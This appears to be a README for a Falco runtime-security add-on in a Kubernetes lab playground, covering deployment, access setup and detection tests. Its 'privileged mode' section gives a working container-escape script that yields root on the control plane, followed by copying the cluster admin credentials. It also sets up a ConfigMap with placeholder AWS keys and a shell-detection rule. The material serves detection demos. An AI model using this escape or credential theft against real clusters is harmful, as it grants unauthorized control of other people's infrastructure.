# Add-On: Falco

## Deploy

The deployment of Falco runtime security is very straigt forward with the playground. Simply execute the script `deploy-falco.sh`, everything else is prepared.

```sh
deploy-falco.sh
```

To ignore events triggerd by services belonging to the playground environment, you can easily whitelist all the playground components by running the following script.

```sh
whitelist_playground_ns.sh
```

Rerun the script whenever you're deploying additional playground components.

Falco is integrated with Prometheus and Grafana as well. A Dashboard is available for import with the ID 11914.

![alt text](https://raw.githubusercontent.com/mawinkler/c1-playground/master/images/falco-grafana.png "Grafana Dashboard")

## Access

Follow the steps for your platform below. A file called `services` is either created or updated with the link and the credentials to connect to falco.

***Linux***

By default, the Falco UI is on port 8082.

Example:

`Falco UI on: http://192.168.1.121:8082/ui/#/`

***Cloud9***

If working on a Cloud9 environment you need to adapt the security group of the corresponding EC2 instance to enable access from your browwer. To share Falco over the internet, follow the steps below.

1. Query the public IP of your Cloud9 instance with

   ```sh
   curl http://169.254.169.254/latest/meta-data/public-ipv4
   ```

2. In the IDE for the environment, on the menu bar, choose your user icon, and then choose Manage EC2 Instance
3. Select the security group associated to the instance and select Edit inbound rules.
4. Add an inbound rule for the `proxy_listen_port` configured in you config.yaml (default: 8082) and choose Source Anywhere
5. Depending on the currently configured Network ACL you might need to add a rule to allow ingoing traffic on the same port. To do this go to the VPC within the Cloud9 instance is running and proceed to the associated Main network ACL.
6. Ensure that an inbound rule is set which allows traffic on the `proxy_listen_port`. If not, click on `Edit inbound rules` and add a rule with a low Rule number, Custom TCP, Port range 8443 (or your configured port), Source 0.0.0.0/0 and Allow.

Access to the services should then be possible with the public ip of your Cloud9 instance with your configured port(s).

Examle

`Falco UI: <http://YOUR-CLOUD9-PUBLIC-IP:8082/ui/#/>`

## Try it

To test the k8s auditing try to create a configmap:

```sh
cat <<EOF | kubectl apply -f -
apiVersion: v1
data:
  ui.properties: |
    color.good=purple
    color.bad=yellow
    allow.textmode=true
  access.properties: |
    aws_access_key_id = AKIAXXXXXXXXXXXXXXXX
    aws_secret_access_key = 1CHPXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
kind: ConfigMap
metadata:
  name: awscfg
EOF
```

If you want to test out own falco rules, create a file called `falco/additional_rules.yaml` write your rules. It will be included when running `deploy-falco.sh`.

Example:

```yaml
- macro: container
  condition: container.id != host

- macro: spawned_process
  condition: evt.type = execve and evt.dir=<

- rule: (AR) Run shell in container
  desc: a shell was spawned by a non-shell program in a container. Container entrypoints are excluded.
  condition: container and proc.name = bash and spawned_process and proc.pname exists and not proc.pname in (bash, docker)
  output: "Shell spawned in a container other than entrypoint (user=%user.name container_id=%container.id container_name=%container.name shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)"
  priority: WARNING
```

### Generate some events

```sh
docker run -it --rm falcosecurity/event-generator run syscall --loop
```

### Fun with privileged mode

```sh
function shell () {
  kubectl run shell --restart=Never -it --image mawinkler/kod:latest \
  --rm --attach \
  --overrides \
    '
    {
      "spec":{
        "hostPID": true,
        "containers":[{
          "name":"kod",
          "image": "mawinkler/kod:latest",
          "imagePullPolicy": "Always",
          "stdin": true,
          "tty": true,
          "command":["/bin/bash"],
          "nodeSelector":{
            "dedicated":"master"
          },
          "securityContext":{
            "privileged":true
          }
        }]
      }
    }
    '
}
```

You can paste this into a new file `shell.sh` and source the file.

```sh
. ./shell.sh
```

Then you can type the following to demonstrate a privilege escalation in Kubernetes.

```sh
shell
```

If you don't see a command prompt, try pressing enter.

```sh
root@shell:/# godmode
root@playground-control-plane:/# 
```

You're now on the control plane of the cluster and should be kubernetes-admin.

If you're wondering what you can do now...

```sh
mkdir -p /root/.kube
cp /etc/kubernetes/admin.conf /root/.kube/config
kubectl auth can-i create deployments -n kube-system
```

```sh
kubectl create deployment echo --image=inanimate/echo-server
kubectl get pods
```
